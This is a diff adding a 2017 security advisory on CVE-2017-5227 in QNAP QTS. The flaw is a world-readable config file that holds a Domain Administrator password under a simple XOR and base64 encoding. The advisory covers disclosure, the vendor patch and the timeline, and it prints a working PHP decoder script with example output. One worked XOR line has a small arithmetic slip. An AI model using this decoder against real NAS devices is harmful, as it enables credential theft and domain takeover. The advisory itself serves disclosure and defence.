@@ -1,0 +1,215 @@
+QNAP QTS Domain Privilege Escalation Vulnerability
+
+ Name              Sensitive Data Exposure in QNAP QTS
+ Systems Affected  QNAP QTS (NAS) all model and all versions < 4.2.4
+ Severity          High 7.9/10
+ Impact            CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:L
+ Vendor            http://www.qnap.com/
+ Advisory          http://www.ush.it/team/ush/hack-qnap/qnap.txt
+ Authors           Pasquale "sid" Fiorillo (sid AT ush DOT it) 
+                   Guido "go" Oricchio (g.oricchio AT pcego DOT com)
+ Date              20170322
+
+I. BACKGROUND
+
+QNAP Systems, founded in 2004, provides network attached storage (NAS)
+and network video recorder (NVR) solutions for home and business use to
+the global market.
+QNAP also delivers a cloud service, called myQNAPcloud, that allows
+users to access and manage the devices from anywhere.
+QTS is a QNAP devices proprietary firmware based on Linux.
+
+ISGroup (http://www.isgroup.biz/) is an Italian Information Security 
+boutique, we found this 0day issue while supporting Guido Oricchio 
+of PCego, a System Integrator, to secure a QNAP product for one of his
+customer.
+
+Responsible disclosure with Qnap: we contacted qnap on public security@
+contact and we escalate fast to their Security Researcher Myron Su on
+PGP emails.
+
+Prior vulnerabilities in QNAP: 
+https://www.qnap.com/en/support/con_show.php?op=showone&cid=41
+
+Information to customers of the vulnerability is shown in their bulletin
+ID NAS-201703-21 (https://www.qnap.com/en/support/con_show.php?cid=113):
+QTS 4.2.4 Build 20170313 includes security fixes for the following
+vulnerabilities: Configuration file vulnerability (CVE-2017-5227)
+reported by Pasquale Fiorillo of the cyber security company ISGroup
+(www.isgroup.biz), a cyber security company, and Guido Oricchio of
+PCego (www.pcego.com), a system integrator.
+
+The latest version of the software at the time of writing can be 
+obtained from:
+
+https://www.qnap.com/en-us/product_x_down/
+https://start.qnap.com/en/index.php
+https://www.qnap.com/
+
+II. DESCRIPTION
+
+The vulnerability allows a local QTS admin user, or other low privileged
+user, to access configuration file that includes a bad crypted Microsoft
+Domain Administrator password if the NAS was joined to a Microsoft 
+Active Directory domain.
+
+The affected component is the "uLinux.conf" configuration file, 
+created with a world-readable permission used to store a Domain 
+Administrator password.
+
+Admin user can access the file using ssh that is enabled by default.
+Other users are not allowed to login, so they have to exploit a 
+component, such as a web application, to run arbitrary command or 
+arbitrary file read.
+
+TLDR: Anyone is able to read uLinux.conf file, world readable by 
+default, can escalate to Domain Administrator if a NAS is a domain 
+member.
+
+III. ANALYSIS
+
+QNAP QTS stores "uLinux.conf" configuration file in a directory 
+accessible by "nobody" and with permission that make them readable by 
+"nobody".
+
+If the NAS was joined to an Active Directory, such file contain a Domain
+Administrator user and password in an easily decrypt format.
+
+In older versions of QTS the Domain Admin's password was stored in
+plaintext.
+
+A) Config file readable by "nobody"
+
+  [~] # ls -l /etc/config/uLinux.conf 
+  -rw-r--r--    1 admin    administ      7312 Dec 10 06:39 /etc/config/uLinux.conf
+
+  Our evidence is for QTS 4.2.0 and QTS 4.2.2 running on a TS-451U, 
+  TS-469L, and TS-221. Access to the needed file are guaranteed to 
+  all the local users, such as httpdusr used to running web sites and 
+  web application hosted on the NAS.
+
+  This expose all the information contained in the configuration file at
+  risk and this is a violation of the principle of least privilege.
+
+  https://en.wikipedia.org/wiki/Principle_of_least_privilege
+
+B) Weak encrypted password in the configuration file
+
+  The Microsoft Active Directory Admin username and password are stored 
+  in the file obfuscated by a simple XOR cypher and base64 encoded.
+
+  In this scenario, a Local File Read vulnerability could lead to full
+  domain compromise given the fact that an attacker can re-use such
+  credentials to authenticate against a Domain Controller with maximum
+  privileges.
+
+  The password field in the uLinux.conf has the following format:
+
+  User = <username>
+  Password = <base64>
+
+  eg: 
+  User = Administrator
+  Password = AwMAAAEBBgYHBwQEIyMgICEhJiYnJyQkQw==
+
+  The "<base64>" decoded is:
+
+  sid@zen:~$echo -n "AwMAAAEBBgYHBwQEIyMgICEhJiYnJyQkQw==" | base64 -d | hexdump -C
+  00000000  03 03 00 00 01 01 06 06  07 07 04 04 23 23 20 20  |............##  |
+  00000010  21 21 26 26 27 27 24 24  43                       |!!&&''$$C|
+  00000019
+
+  Each byte xored with \x62 is the hex ascii code of the plaintext char.
+  Eg: 
+    \x03 ^ \x62 = \x61 (a)
+    \x00 ^ \x62 = \x61 (b)
+    ...
+    \x24 ^ \x62 = \x46 (F)
+    \x43 ^ \x62 = \x21 (!)
+    
+  The plaintext password is: aabbccddeeffAABBCCDDEEFF!
+
+IV. EXPLOIT
+
+The following code can be used to decode the password:
+
+#!/usr/bin/php
+<?php
+$plaintext = str_split(base64_decode($argv[1]));
+foreach($plaintext as $chr) {
+	echo chr(ord($chr)^0x62);
+}
+echo "\n";
+
+Eg: sid@zen:~$ ./decode.php AwMAAAEBBgYHBwQEIyMgICEhJiYnJyQkQw==
+aabbccddeeffAABBCCDDEEFF!
+
+V. VENDOR RESPONSE
+Vendor released QTS 4.2.4 Build 20170313 that contains the proper
+security patch. At the time of this writing an official patch is
+currently available.
+
+VI. CVE INFORMATION
+
+Mitre assigned the CVE-2017-5227 for this vulnerability, internally to
+Qnap it's referred as Case NAS-201703-21.
+
+VII. DISCLOSURE TIMELINE
+
+20161212 Bug discovered
+20170106 Request for CVE to Mitre
+20170106 Disclosure to security@qnap.com
+20170107 Escalation to Myron Su, Security Researcher from QNAP (fast!)
+20170107 Details disclosure to Myron Su
+20170109 Got CVE-CVE-2017-5227 from cve-assign
+20170110 Myron Su confirm the vulnerability
+20170203 We asks for updates, no release date from vendor
+20170215 We extend the disclosure date as 28 Feb will not be met
+20170321 QNAP releases the QTS 4.2.4 Build 20170313
+20170322 Advisory disclosed to the public
+
+VIII. REFERENCES
+
+[1] Top 10 2013-A6-Sensitive Data Exposure
+    https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure
+
+[2] Access Control Cheat Sheet
+    https://www.owasp.org/index.php/Access_Control_Cheat_Sheet
+
+[3] https://forum.qnap.com/viewtopic.php?t=68317
+    20121213 User reporting that the password was stored in plaintext in
+    a world-readable file
+    
+[4] https://www.qnap.com/en/support/con_show.php?cid=113
+    Qnap Security Bullettin NAS-201703-21 
+
+IX. CREDIT
+
+Pasquale "sid" Fiorillo and Guido "go" Oricchio are credited with the 
+discovery of this vulnerability.
+
+Pasquale "sid" Fiorillo
+web site: http://www.pasqualefiorillo.it/
+mail: sid AT ush DOT it
+
+Guido "go" Oricchio
+web site: http://www.pcego.com/
+mail: g.oricchio AT pcego DOT com
+
+X. LEGAL NOTICES
+
+Copyright (c) 2017 Pasquale "sid" Fiorillo
+
+Permission is granted for the redistribution of this alert
+electronically. It may not be edited in any way without mine express
+written consent. If you wish to reprint the whole or any
+part of this alert in any other medium other than electronically,
+please email me for permission.
+
+Disclaimer: The information in the advisory is believed to be accurate
+at the time of publishing based on currently available information. Use
+of the information constitutes acceptance for use in an AS IS condition.
+There are no warranties with regard to this information. Neither the
+author nor the publisher accepts any liability for any direct, indirect,
+or consequential loss or damage arising from use of, or reliance on,
+this information.
